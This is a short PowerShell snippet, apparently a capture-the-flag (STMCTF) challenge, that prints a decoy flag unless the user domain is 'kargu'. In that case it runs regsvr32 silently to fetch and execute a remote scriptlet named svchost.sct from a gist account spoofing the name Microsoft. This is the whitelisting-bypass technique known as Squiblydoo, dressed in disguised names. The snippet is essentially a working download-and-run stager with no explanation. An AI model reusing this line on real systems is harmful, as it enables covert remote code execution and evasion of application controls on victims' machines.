if ($env:userdomain -eq "kargu") {
	regsvr32 /s /n /u /i:https://gist.githubusercontent.com/M1crosft/00724f37c968c536a45f90b3368c7292/raw/ca76e4c4100019220f2031a28e06c36ca9026542/svchost.sct scrobj.dll
} else {
	Write-Host 'STMCTF{d4ha_y3n1_b4sl4d1k_not:bu_flag_degil}'
}